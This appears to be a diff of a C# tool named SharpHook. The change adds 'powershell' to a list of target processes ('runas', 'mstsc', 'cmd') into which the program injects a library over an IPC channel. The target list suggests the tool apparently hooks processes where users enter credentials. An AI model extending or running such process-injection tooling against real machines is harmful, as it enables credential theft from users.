@@ -15,7 +15,7 @@ namespace SharpHook
         static void Main(string[] args)
         {
             Int32 targetPID = 0;
-            string targetExe = null;
+           
 
             // Will contain the name of the IPC server channel
             string channelName = null;
@@ -49,7 +49,7 @@ namespace SharpHook
                     "runas",
                     "mstsc",
                     "cmd",
-                    //"powershell"  - start-process also works enable it after....
+                    "powershell"
                 };
 
                 
@@ -78,6 +78,8 @@ namespace SharpHook
                                     channelName         // the parameters to pass into injected library
                                     );
                                 injectedProcesses.Add(processes[i].Id);
+
+                             
 
                             }
                             catch (Exception e)
